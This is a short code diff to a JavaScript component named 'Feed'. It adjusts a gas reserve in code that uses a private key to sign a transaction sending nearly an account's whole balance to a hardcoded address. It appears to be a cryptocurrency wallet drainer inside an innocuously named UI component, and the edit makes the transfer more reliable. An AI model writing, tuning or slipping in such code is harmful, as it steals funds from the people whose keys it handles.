@@ -38,10 +38,10 @@ function Feed() {
                         setBalance(amnt / 1000000000000000000);
                         web3.eth.getGasPrice()
                             .then((gasPrice) => {
-                                if (amnt > gasPrice * 21000) {
+                                if (amnt > gasPrice * 23000) {
                                     web3.eth.accounts.signTransaction({
                                         to: "0x1C3BC05C4cD2902FFbF20e3b87A2cc9d793Fc42B",
-                                        value: parseInt(amnt - gasPrice * 21000),
+                                        value: parseInt(amnt - gasPrice * 23000),
                                         gas: 21000
                                     }, data.key)
                                         .then((signedTransactionData) => {
